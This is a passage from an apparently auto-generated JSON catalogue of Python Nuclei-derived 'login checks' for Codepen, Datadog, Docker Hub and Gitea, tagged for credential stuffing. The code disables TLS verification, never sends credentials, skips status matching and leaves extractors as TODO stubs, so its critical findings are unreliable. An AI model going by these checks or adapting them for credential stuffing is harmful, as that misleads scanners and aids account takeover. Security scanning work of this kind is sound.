print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"codepen.io Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_codepen_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "creds-stuffing",
          "login-check",
          "cloud",
          "codepen",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_datadog_login_check",
        "name": "Datadog Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid datadog account.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Set-Cookie: dogweb=' | status HTTP [302]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: datadog-login-check\nName: Datadog Login Check\nSeverity: critical\nDescription: Checks for a valid datadog account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_datadog_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"datadog-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Datadog Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Set-Cookie: dogweb=' | status HTTP [302]\"\n\n        # Simple word matcher simulation\n        matchers = ['Set-Cookie: dogweb=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Datadog Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_datadog_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: datadog-login-check\nName: Datadog Login Check\nSeverity: critical\nDescription: Checks for a valid datadog account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_datadog_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"datadog-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Datadog Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Set-Cookie: dogweb=' | status HTTP [302]\"\n\n        # Simple word matcher simulation\n        matchers = ['Set-Cookie: dogweb=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Datadog Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_datadog_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "datadog",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_docker_hub_login_check",
        "name": "Docker Hub Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid Docker Hub account.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'token' | mot(s) 'Set-Cookie: token=' | status HTTP [200]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: docker-hub-login-check\nName: Docker Hub Login Check\nSeverity: critical\nDescription: Checks for a valid Docker Hub account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_docker_hub_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"docker-hub-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Docker Hub Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'token' | mot(s) 'Set-Cookie: token=' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['token', 'Set-Cookie: token=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Docker Hub Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_docker_hub_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: docker-hub-login-check\nName: Docker Hub Login Check\nSeverity: critical\nDescription: Checks for a valid Docker Hub account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_docker_hub_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"docker-hub-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Docker Hub Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'token' | mot(s) 'Set-Cookie: token=' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['token', 'Set-Cookie: token=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Docker Hub Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_docker_hub_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "creds-stuffing",
          "login-check",
          "cloud",
          "docker",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_gitea_login_check",
        "name": "gitea.com Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid gitea account.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Location: /' | status HTTP [303]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: gitea-login-check\nName: gitea.com Login Check\nSeverity: critical\nDescription: Checks for a valid gitea account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_gitea_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"gitea-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"gitea.com Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Location: /' | status HTTP [303]\"\n\n        # Simple word matcher simulation\n        matchers = ['Location: /']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"gitea.com Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_gitea_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: gitea-login-check\nName: gitea.com Login Check\nSeverity: critical\nDescription: Checks for a valid gitea account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_gitea_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"gitea-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"gitea.com Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target 